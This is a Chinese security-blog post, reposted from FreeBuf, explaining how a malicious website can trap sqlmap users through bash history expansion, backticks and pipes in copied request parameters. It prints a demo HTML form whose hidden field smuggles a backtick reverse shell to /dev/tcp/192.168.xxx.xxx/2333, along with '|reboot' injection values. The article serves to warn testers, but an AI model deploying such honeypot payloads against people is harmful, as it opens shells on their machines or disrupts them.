##  使用Sqlmap的你可能踩中了“蜜罐”

猪猪谈安全  [ web安全工具库 ](javascript:void\(0\);)

**web安全工具库** ![]()

微信号 websec-tools

功能介绍 将一些好用的web安全工具和自己的学习笔记分享给大家。。。

____

__

收录于话题

## Par0：楔子

> 你站在桥上看风景，看风景的人在楼上看你，
>
> 明月装饰了你的窗子，你装饰了别人的梦。

## Par1：你要了解的事

渗透测试的同学应该都知道，在Linux下，sqlmap执行的语句大多是：

  *   * 

    
    
    Bash#sqlmap –u "http://sample.com/a=xxx&b=xxx" –data "postdata"Bash#python sqlmap.py –u "http://sample.com/a=xxx&b=xxx" –cookie "cookedata"

如此形式的语句执行，实际上都是在shell中，执行bash命令。

但是，bash命令中，一些使用几率较小的特性，很多安全测试人员可能都不求甚解。

通过阅读Bash参考手册，可以了解到，在bash命令中，一些字符在封闭的双引号中，有特殊的含义，并非所见即所得。

  *   *   * 

    
    
    Enclosing characters in double quotes (‘"’)preserves the literal value of all characters within the quotes, with theexception of ‘$’, ‘`’, ‘\’, and, whenhistory expansion is enabled, ‘!’. When the shell is in POSIX mode (seeBash POSIX Mode),the ‘!’ hasno special meaning within double quotes, even when history expansion isenabled. The characters ‘$’ and ‘`’ retain theirspecial meaning within double quotes (see Shell Expansions).The backslash retains its special meaning only when followed by one of the followingcharacters: ‘$’, ‘`’, ‘"’, ‘\’, or newline. Within doublequotes, backslashes that are followed by one of these characters are removed.Backslashes preceding characters without a special meaning are left unmodified.A double quote may be quoted within double quotes by preceding it with abackslash. If enabled, history expansion will be performed unless an ‘!’ appearing indouble quotes is escaped using a backslash. The backslash preceding the ‘!’ is notremoved.  
    The special parameters ‘*’ and ‘@’ have specialmeaning when in double quotes (see Shell Parameter Expansion).

如果，懒着弄明白上面的意思，最好的办法就是在自己的Linux中执行相关的命令：

如ping “!!”,ping “`reboot`”，看看会产生怎样神奇的效果

说的明白点，双引号中的”!!”或者”!+数字”，会替换成历史命令，执行”history”命令,就可以知道哪些数字对应哪些命令了。如果我将”!”放入到http请求中，而渗透测试人员执行例如

  * 

    
    
    bash# sqlmap -u "www.asnine.com/test" --data"post!!request=hacked"

首先双引号中的!!会被替换成你最近执行的一条历史命令，然后在发送到webserver，如果webserver是恶意的，那么他就可以轻松的收集到你的bash中的历史输入了，也算是一种信息泄露吧。

如果仅仅是信息收集，危害还小一些，如果用”`”(数字1前面那个反单引号字符)，可就厉害了。任何”`”之间的命令，都会被执行，如果仅仅是为了好玩，一个reboot，就够你受了，但是如果还有其他的想法，你的系统可就危在旦夕了

如果我将这些特殊的字符(“!” ,
“`”…)放到get/post/cookie等http请求参数中，万一有人用sqlmap去对该网站进行安全测试，而注入参数正好包含了这些特殊字符，那么有意思的事情就产生了

此时，你通过拦截浏览器获取的http post如果是恶意代码

执行：

  * 

    
    
    sqlmap –u "http://sample.com/a=xxx&b=xxx" –data "evilcode"

结果就是，装逼不成反被BI～

## Par2：姑且称之为sqlmap honeypot吧

现在，我的目的很单纯，就是将特殊字符嵌入到http的请求数据中，以达到对渗透人员的反戈一击。

要做到一个强力的反击，首先需要将诸如”!”, “`”等字符串，放入http请求中。

而http请求，主要包括get request,cookie,post request三种。

大多时候，渗透人员通过获取post数据作为sql的注入点，所以，要找到一种在post情况下的危险参数注入。

由于post数据，可以构造的相对比较复杂，很多时候，渗透人员只是将所有参数一股脑的作为sqlmap的data参数进行测试，所以可以很好的做到将危险参数嵌入到post
data数据中，以达到隐藏自身的目的。

接下来，要做的就是如果渗透人员在通过利用例如Burp Suite等工具获取sqlmap注入使用的参数时，获取到的字符为未编码的可见字符。

在用form进行提交数据时，如果添加enctype=”text/plain”属性，那么，就可以做到可见即可得。

测试demo：

    
    
    <html>
    
    <head>
    
    <title> A sqlmap honeypot demo</title>
    
    </head>
    
    <body>
    
    <input>search the user</input>
    
    <form id="myForm" action="username.html" method="post" enctype="text/plain">
    
    <input type='hidden' name='name'value='Robin&id=4567&command=shell`bash -i >&/dev/tcp/192.168.xxx.xxx/2333 0>&1`&port=1234'/>
    
    <input type="button"onclick="myForm.submit()" value="Submit">
    
    </form>
    
    </body>
    
    </html>

访问该页面，进行查询时，发送到请求为：

![](https://gitee.com/fuli009/images/raw/master/public/20210805091134.png)

这时，很多没有经验的安全渗透人员就可能将postdata，复制，粘贴，sqlmap执行之：

Boom！

## Par3：换个姿势，再来一遍

前两拍，为了所谓的神秘感，利用人们不常用的bash特性，强行装了一波。

但是，既然利用场景是：

    
    
    bash# exec "evil code"

那么事情可能会变得更加简单。

使用过Linux的，大多数都用到过管道(|)，而这个功能，能更好好的完成任务。

如果注入参数是：

    
    
    "|reboot" (参数中包含双引号)

那么执行的命令则为：

    
    
    bash# exec ""|reboot""

以上，我都假设的是，渗透人员将参数放入到双引号(“)中。但使用管道，单引号的问题也迎刃而解

针对单引号，可以将注入参数设置为：

    
    
    '|reboot'

Double Kill！

## Par4：尾声

以上都是我在测试一个网站时，其cookie中包含了

    
    
    "!+number"

导致了sqlmap语句的执行错误引起的。于是乎，深入追踪了下，发现其实主要原因属于bash的特性。如果利用这个特性做恶，的确存在一定的安全风险。

很多时候，我们并不能确保输入数据安全性，尤其在使用sqlmap这种输入参数来源于攻击目标的情况下。如果有人在获取的参数(get/post/cookie)上动了手脚，渗透人员很可能偷鸡不成拾把屎。  

相信，只要理解了攻击手段，很多人会构造出更完美的攻击数据，这里就不献丑了。

而且，伪装到位的话，服务器甚至可以返回一些注入成功的信息

这个时候，sqlmap使用者，就有些悲剧了，他们沉浸在在成功的喜悦中，却未料到背后隐藏的杀机

当然，这种利用bash特性的攻击方式，并不仅仅作用于sqlmap，也可能用于其它依赖于Linux命令行执行的程序。Sqlmap只不过是这种特性的一个很好的利用场景。  

 **转载于https://www.freebuf.com/sectool/116706.html#**  

  

禁止非法，后果自负

欢迎关注公众号：web安全工具库

欢迎关注视频号：之乎者也吧

![](https://gitee.com/fuli009/images/raw/master/public/20210805091135.png)

![]()

![](https://gitee.com/fuli009/images/raw/master/public/20210805091136.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

使用Sqlmap的你可能踩中了“蜜罐”

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

